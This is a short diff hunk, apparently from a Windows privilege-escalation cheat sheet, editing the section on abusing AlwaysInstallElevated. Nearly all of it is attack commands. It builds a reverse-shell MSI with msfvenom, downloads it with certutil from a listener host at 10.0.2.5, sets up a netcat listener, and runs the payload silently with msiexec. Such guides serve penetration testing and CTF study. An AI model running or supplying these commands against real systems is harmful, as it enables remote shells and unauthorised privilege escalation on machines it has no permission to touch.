@@ -469,7 +469,7 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
 certutil.exe -urlcache -f http://10.0.2.5:8888/evil.msi evil.msi
 sudo rlwrap nc- nlvp 443
-evil.msi
+evil.msi | msiexec /i evil.msi /quiet /qn /norestart
 ```
 ### Abusing Server Operators Group
 ```
